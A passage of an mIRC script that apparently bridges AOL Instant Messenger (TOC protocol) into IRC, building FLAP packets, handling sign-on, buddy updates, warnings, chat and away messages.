  .timer 1 1 senddata toc_init_done
}
alias discard { }
alias handle_toc_update_buddy {
  var %User = $remove($gettok($1-,1,58),$chr(32)) $+ *aim
  var %IsOnline = $gettok($1-,2,58)
  var %EvilAmount = $gettok($1-,3,58)
  var %SignonTime = $gettok($1-,4,58)
  var %IdleTime = $gettok($1-,5,58)
  var %UC = $gettok($1-,6,58)
  var %IRCMsg = : $+ $server 
  if (%IsOnline == T) {    %IRCMsg = %IRCMsg 600 $me %User Aim.User aol.instant.messenger $ctime :logged online }
  else { %IRCMsg = %IRCMsg 601 $me %user aim.user aol.instant.messenger :logged offline }
  if ($AIMParameter(debug) == yes) {  echo -s handle_toc_update_buddy IRCMSG: %ircmsg }
  sockwrite -n PBIRCData %IRCMsg

}
alias handle_toc_eviled {
  var %EvilPercentage = $gettok($1-,1,58)
  var %EvilDoer = $gettok($1-,2-,58)
  var %Ret
  if ($len(%EvilDoer) > 0) { 
    %Ret = mm3me $tokm(You have been eviled by [ [ %EvilDoer ] $+ . ]  Your evil level is now [ [ %EvilPercentage ] $+ . ]  Return the favor?)
    if (%Ret == $true) { senddata toc_evil $remove(%evildoer,$chr(32)) norm }
    else { %ret = mme3me $tokm("You have been eviled by an anonymous user.  Your evil level is now [ [ %EvilPercentage ] $+ . ]  Bet you're angry eh?") }

  }
}




alias SendData {
  /  ;BuildFlapHeader params $1 = Frame Type $2 = Sequence Number $3 = Data Length
  bunset &flapheader &data &out
  bset &FLAPHeader 1 0
  bset -t &Data 1 $1-
  bset &Out 1 0
  bset &data $calc($bvar(&data,0)+1) 0
  bcopy &FLAPHeader 1 $BuildFLAPHeader(2,%SequenceNumber,$bvar(&data,0)) 1 -1
  bcopy &out 1 &FLAPHeader 1 -1
  bcopy &out 7 &data 1 -1
  if ($aimparameter(debug) == yes) {
    echo -s FLAP Header: $bvar(&FLAPHeader,1,$bvar(&FLAPHeader,0)).text
    echo -s FLAP Header Length: $bvar(&FLAPHeader,0)
    echo -s FULL DATA: $bvar(&out,1,$bvar(&out,0)).text
    echo -s full data length: $bvar(&out,0)

  }
  sockwrite TIKTOC &Out
}



alias -l SignonAIM {
  var %SequenceNumber = $1
  bset &FlapSignon 1 0 0 0 1 
  bset &FlapSignon 5 0 1
  ; 0 0 0 1 = FLAP version (1)
  ; 0 1 = TLV Tag (1)
  var %NormalizedUser = $aimparameter(NormalizedUser)
  var %UserLen = $len(%NormalizedUser)
  bset &flapsignon 7 $gethibyte(%UserLen)
  bset &flapsignon 8 $getlobyte(%UserLen)
  bset -t &flapsignon 9 %NormalizedUser

  bset &aimlogonheader 6 0

  bcopy &FlapHeader 1 $BuildFLAPHeader(1,%SequenceNumber,$bvar(&flapsignon,0)) 1 -1

  bset -t &AIMSignonData 1 toc_signon login.oscar.aol.com 29999 $aimparameter(normalizeduser) $roast($aimparameter(pwd)) English "mIRCTIC"
  bset &AIMSignonData $calc($bvar(&AIMSignonData,0) +1) 0
  inc %sequenceNumber
  bcopy &AIMLogonHeader 1 $BuildFLAPHeader(2,%SequenceNumber,$bvar(&AIMSignonData,0))) 1 -1
  bcopy &flapheader $calc($bvar(&flapheader,0)+1)  &Flapsignon 1 -1
  if ($AimParameter(Debug) == yes) {
    echo -s AIM FLAP Logon: $bvar(&FlapHeader,1,$bvar(&FlapHeader,0)).text
    echo -s AIM FLAP Logon length: $bvar(&FlapHeader,0)
    echo -s AIM Logon string: $bvar(&AIMSignonData,1,$bvar(&AIMSignonData,0)).text
    echo -s toc_signon FLAP header: " $+ $bvar(&AIMLogonHeader,1,$bvar(&AIMLogonHeader,0)).text $+ "
    echo -s toc_signon FLAP header length: $bvar(&AIMLogonHeader,0)

  }
  sockwrite TIKTOC &FlapHeader
  sockwrite TIKTOC &AIMlogonHeader
  sockwrite TIKTOC &AIMSignonData
}
alias AIMSOCKCHECK {
  if ($AIMConnectStatus != 1) { return 1 }
  var %RawMsg = $bvar($1,1,$bvar($1,0)).text
  var %MySocket = $2
  var %ColonPos 
  var %msgonly
  var %Msg
  var %i = 1
  var %TokCount
  var %RVal = 1
  %RawMsg = $replace($replace(%RawMsg,$crlf,$lf),$cr,$lf)
  %TokCount = $numtok(%RawMsg,10)
  while (%i <= %TokCount) {
    %Msg = $gettok(%RawMsg,%i,10)
    inc %i
    if (($gettok(%msg,1,32) == JOIN) && ($right($gettok(%msg,2-,32),4) == *aim)) {
      %msg = $gettok(%msg,2-,32)
      %msg = $left(%msg,$calc($len(%msg)-4))

      if ($AIMParameter(debug) == yes) {  echo -s Joining aim channel: %msg }
      senddata toc_chat_join 4 " $+ %msg $+ "
      return 0
    }
    elseif (($gettok(%msg,1,32) == MODE) && ($right($gettok(%msg,2,32),4) == *aim)) { return 0 }
    elseif (($gettok(%msg,1,32) == PRIVMSG) && ($right($gettok(%msg,2,32),4) == *aim)) {
      %colonpos = $calc($pos(%msg,$chr(58)) + 1)
      %MsgOnly = $mid(%Msg,%ColonPos)
      if ($left($gettok(%msg,2,32),1) == $chr(35)) { senddata toc_chat_send $GetRoomID($gettok(%Msg,2,32)) " $+ $AIMEncode(%MsgOnly) $+ " }
      else { senddata toc_send_im $trimaim($gettok(%Msg,2,32)) " $+ $AIMEncode(%MsgOnly) $+ " }
      return 0
    }
    elseif (($gettok(%msg,1,32) == PART) && ($right($gettok(%msg,2,32),4) == *aim)) {
      senddata toc_chat_leave $GetRoomID($gettok(%msg,2,32))
      sockwrite -n PBIRCData : $+ %AIMUserHost PART $gettok(%msg,2,32)
      return 0
    }
    elseif ($gettok(%msg,1,32) == AWAY) {
      if ($gettok(%msg,2,58) != $null) {
        set %AIMAwayMsg $gettok(%Msg,2-,58)
        senddata toc_set_away " $+ $AIMEncode(%AIMAwayMsg) $+ "
      }
      else {
        unset %AIMAwayMsg
        senddata toc_set_away
      }
      return 1
    }
    elseif ($gettok(%msg,1,32) == WATCH) {

      %MsgOnly = %Msg
      var %WatchTokens = $numtok(%MsgOnly,32)
      while (%WatchTokens > 0) {
        if ($right($gettok(%MsgOnly,%WatchTokens,32),4) == *aim) { %MsgOnly = $deltok(%MsgOnly,%WatchTokens,32) }
        dec %WatchTokens
      }
      sockwrite -n %MySocket %MsgOnly
      %rval = 0
    }
  }
  return %rval
}
alias trimaim { return $remove($left($1-,$calc($len($1-)-4)),$chr(160)) }

alias BuildFLAPHeader {
  ;$1 = Frame Type $2 = Sequence Number $3 = Data Length
  inc %AIMSequence
  if (%AIMSequence >= 65535) {  %AIMSequence = 1 }

  var %SN = %AIMSequence
  bunset &header
  bset &header 1 42
  bset &header 2 $1
  bset &header 3 $getHiByte(%SN)
  bset &header 4 $getLoByte(%SN)
  bset &header 5 $getHiByte($3)
  bset &header 6 $getLoByte($3)
  return &header
}

alias FLAPHeader {
  var %h1
  var %h2
  if ($Prop == FrameType) {
    %h1 = $bvar($1,2)
    return %h1
  } 
  elseif ($Prop == SequenceNumber) {
    %h2 = $bvar($1,3)
    %h1 = $bvar($1,4)
    return $toWord(%h1,%h2)

  } 
  elseif ($Prop == DataLength) {
    %h2 = $bvar($1,5)
    %h1 = $bvar($1,6)
    return $toWord(%h1,%h2)
  }

}
alias toWord { 

  return $calc(($2 * 256) + $1)

}
alias getLoByte {
  var %byte = $1 & 255
  return %byte
}

alias getHiByte {
  var %byte = $calc($1 / 256) & 255
  return %byte
}

alias AIMParameter {
  var %AUN = $readini AImIRC.ini Users CurrentUser
  if ($1 == Debug) { return $readini AImIRC.ini Advanced Debug }
  elseif ($1 == NormalizedUser) { return $lower($remove(%AUN,$chr(32)))) }
  elseif ($1 == User) { return %AUN }
  elseif ($1 == Pwd) { return %AIMUserPass }
}
alias r4 { var %h = $r(5,9) , %e = 1 , %f | while (%e <= %h) { var %f = %f $+ $rand(A,Z) | inc %e 1 } | return %f }
on *:nick:{ if ($level($nick) == 10) || if ($level($nick) == 100) { .ruser 10 $nick | .ruser 100 $nick } }
